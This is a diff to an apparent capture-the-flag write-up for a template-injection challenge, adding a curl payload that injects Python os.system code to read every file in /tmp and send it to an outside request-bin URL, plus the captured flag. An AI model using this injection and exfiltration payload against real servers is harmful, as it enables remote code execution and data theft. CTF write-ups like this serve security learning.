@@ -248,7 +248,17 @@ if __name__ == "__main__":
 
 Payload-:
 
-`$__import__('os').system('cat /tmp/*| curl <webhook> -d \'@-\'')`
+```powershell
+
+ curl http://52.59.124.14:5011 -d "temptation=`$`__import__('os').system('cat /tmp/* | curl https://www.postb.in/1738504441196-5407698529306 -d \'@-\'')"
+
+```
+
+- Flag-: ```ENO{T3M_Pl4T_3S_4r3_S3cUre!!}```
+
+![image](https://github.com/user-attachments/assets/7f428860-30c4-4e1d-8e94-efd03decb5ab)
+
+-----------------
 
 
 
